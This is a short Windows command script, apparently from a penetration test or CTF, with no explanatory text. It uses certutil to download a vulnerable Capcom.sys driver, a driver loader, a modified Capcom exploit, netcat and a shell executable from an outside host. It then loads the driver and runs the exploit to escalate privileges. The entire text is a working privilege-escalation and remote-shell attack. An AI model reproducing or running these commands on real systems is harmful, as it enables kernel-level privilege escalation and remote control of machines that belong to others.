
mkdir c:\temp
certutil -urlcache -split -f http://10.10.0.0/Capcom.sys C:\temp\Capcom.sys
certutil -urlcache -split -f http://10.10.0.0/EOPLOADDRIVER.exe C:\temp\EOPLOADDRIVER.exe
certutil -urlcache -split -f http://10.10.0.0/ExploitCapcom_modded.exe C:\temp\ExploitCapcom_modded.exe
certutil -urlcache -split -f http://10.10.0.0/netcat.bat C:\temp\netcat.bat
certutil -urlcache -split -f http://10.10.0.0/shell.exe C:\temp\shell.exe
certutil -urlcache -split -f http://10.10.0.0/nc.exe C:\temp\nc.exe
C:\temp\EOPLOADDRIVER.exe System\CurrentControlSet\MyService C:\temp\capcom.sys
C:\temp\ExploitCapcom_modded.exe
